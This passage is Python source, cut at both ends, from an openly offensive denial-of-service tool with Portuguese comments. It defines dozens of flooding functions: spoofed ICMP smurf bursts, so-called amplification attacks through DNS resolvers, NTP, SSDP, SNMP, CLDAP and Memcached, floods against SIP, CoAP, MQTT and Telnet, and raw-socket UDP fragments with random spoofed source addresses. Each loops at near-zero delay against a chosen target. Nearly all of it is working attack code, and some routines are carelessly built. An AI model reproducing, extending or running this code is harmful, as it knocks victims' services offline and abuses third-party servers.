                scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-SMURF-BURST] Enviado para {broadcast_ip} (spoof: {target})" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Amplification
def dns_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    open_resolvers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            resolver = random.choice(open_resolvers)
            payload = dns.message.make_query(target, dns.rdatatype.ANY).to_wire() + random._urandom(32768)  # 32KB adicional
            sock.sendto(payload, (resolver, 53))
            print(Fore.GREEN + f"  [DNS-AMP] Enviado para {target} via {resolver}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque NTP Amplification
def ntp_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    ntp_servers = ["pool.ntp.org", "time.google.com", "time.windows.com", "time.nist.gov"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(32768)  # 32KB payload
            server = random.choice(ntp_servers)
            sock.sendto(payload, (server, 123))
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [NTP-AMP] Enviado para {target} via {server}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSDP Amplification
def ssdp_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [SSDP-AMP] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Amplification
def snmp_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(32768)
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [SNMP-AMP] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CLDAP Amplification
def cldap_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00" + random._urandom(32768)
            sock.sendto(payload, (target, 389))
            print(Fore.GREEN + f"  [CLDAP-AMP] Enviado para {target}:389" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Memcached Amplification
def memcached_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x00\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a" + random._urandom(32768)
            sock.sendto(payload, (target, 11211))
            print(Fore.GREEN + f"  [MEMCACHED-AMP] Enviado para {target}:11211" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque LDAP Amplification
def ldap_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00" + random._urandom(32768)
            sock.sendto(payload, (target, 389))
            print(Fore.GREEN + f"  [LDAP-AMP] Enviado para {target}:389" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Chargen Amplification
def chargen_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(32768)  # 32KB payload
            sock.sendto(payload, (target, 19))
            print(Fore.GREEN + f"  [CHARGEN-AMP] Enviado para {target}:19" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque QOTD Amplification
def qotd_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(32768)  # 32KB payload
            sock.sendto(payload, (target, 17))
            print(Fore.GREEN + f"  [QOTD-AMP] Enviado para {target}:17" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Burst Amplification
def dns_burst_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    open_resolvers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            resolver = random.choice(open_resolvers)
            payload = dns.message.make_query(target, dns.rdatatype.ANY).to_wire()
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (resolver, 53))
            print(Fore.GREEN + f"  [DNS-BURST-AMP] Enviado para {target} via {resolver}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque NTP Mass Amplification
def ntp_mass_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    ntp_servers = ["pool.ntp.org", "time.google.com", "time.windows.com"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(65535)  # 64KB payload
            server = random.choice(ntp_servers)
            sock.sendto(payload, (server, 123))
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [NTP-MASS-AMP] Enviado para {target} via {server}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSDP Mass Amplification
def ssdp_mass_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n" + random._urandom(65535)
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [SSDP-MASS-AMP] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Burst Amplification
def snmp_burst_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 161))
            print(Fore.GREEN + f"  [SNMP-BURST-AMP] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CLDAP Mass Amplification
def cldap_mass_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00" + random._urandom(65535)
            sock.sendto(payload, (target, 389))
            print(Fore.GREEN + f"  [CLDAP-MASS-AMP] Enviado para {target}:389" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Memcached Burst Amplification
def memcached_burst_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x00\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 11211))
            print(Fore.GREEN + f"  [MEMCACHED-BURST-AMP] Enviado para {target}:11211" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque LDAP Burst Amplification
def ldap_burst_amplification(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 389))
            print(Fore.GREEN + f"  [LDAP-BURST-AMP] Enviado para {target}:389" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)



# Ataque SIP Flood (VoIP)
def sip_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [SIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque CoAP Flood (IoT)
def coap_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(32768)  # 32KB payload
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Flood (IoT)
def mqtt_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [MQTT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Telnet Flood
def telnet_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 23))
            payload = random._urandom(32768)  # 32KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [TELNET] Enviado para {target}:23" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Burst Flood
def sip_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 5060))
            print(Fore.GREEN + f"  [SIP-BURST] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP Mass Flood
def coap_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(65535)  # 64KB payload
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP-MASS] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Burst Flood
def mqtt_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(32768)
            for _ in range(20):  # Burst de 20 pacotes
                sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-BURST] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Telnet Mass Flood
def telnet_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 23))
            payload = random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [TELNET-MASS] Enviado para {target}:23" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Random Flood
def sip_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user{random.randint(1,999999)}@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [SIP-RANDOM] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP Burst Flood
def coap_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 5683))
            print(Fore.GREEN + f"  [COAP-BURST] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Mass Flood
def mqtt_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(65535) + b"x" * 32768  # 96KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-MASS] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Telnet Burst Flood
def telnet_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 23))
            payload = random._urandom(32768)
            for _ in range(20):  # Burst de 20 pacotes
                sock.send(payload)
            print(Fore.GREEN + f"  [TELNET-BURST] Enviado para {target}:23" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Mass Flood
def sip_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(65535)
            sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [SIP-MASS] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP Random Flood
def coap_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + binascii.hexlify(random._urandom(32768)).encode('ascii')  # 32KB payload aleatório
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP-RANDOM] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Random Flood
def mqtt_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + binascii.hexlify(random._urandom(32768)).encode('ascii')
            sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-RANDOM] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Telnet Random Flood
def telnet_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 23))
            payload = binascii.hexlify(random._urandom(32768)).encode('ascii')  # 32KB payload aleatório
            sock.send(payload)
            print(Fore.GREEN + f"  [TELNET-RANDOM] Enviado para {target}:23" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque UPnP Flood
def upnp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: upnp:rootdevice\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [UPNP] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Flood
def snmp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(32768)
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [SNMP] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque UPnP Burst Flood
def upnp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: upnp:rootdevice\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\n\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 1900))
            print(Fore.GREEN + f"  [UPNP-BURST] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Mass Flood
def snmp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(65535)
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [SNMP-MASS] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP High Rate Flood
def sip_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n"
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (target, 5060))
            print(Fore.GREEN + f"  [SIP-HIGH-RATE] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP High Rate Flood
def coap_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65"
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (target, 5683))
            print(Fore.GREEN + f"  [COAP-HIGH-RATE] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT High Rate Flood
def mqtt_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(32768)
            for _ in range(10):  # 10 pacotes por iteração
                sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-HIGH-RATE] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Telnet High Rate Flood
def telnet_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 23))
            payload = random._urandom(32768)
            for _ in range(10):  # 10 pacotes por iteração
                sock.send(payload)
            print(Fore.GREEN + f"  [TELNET-HIGH-RATE] Enviado para {target}:23" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)  # Máximo tamanho UDP
            sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_stun_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x01\x00\x00" + random._urandom(16384)  # STUN header + 16KB payload
            sock.sendto(payload, (target, 3478))
            print(Fore.GREEN + f"  [UDP-STUN] Enviado para {target}:3478" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_fragment_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 1480, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            udp_header = struct.pack("!HHHH", random.randint(1024, 65535), port, 1452, 0)
            payload = random._urandom(1444)
            sock.sendto(ip_header + udp_header + payload, (target, port))
            print(Fore.GREEN + f"  [UDP-FRAG] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_dns_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1, 999999)}.com", dns.rdatatype.ANY).to_wire() + random._urandom(16384)
            sock.sendto(payload, (target, 53))
            print(Fore.GREEN + f"  [UDP-DNS] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ntp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(16384)  # NTP header + 16KB payload
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [UDP-NTP] Enviado para {target}:123" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ssdp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n" + random._urandom(16384)
            sock.sendto(payload, (target, 1900))
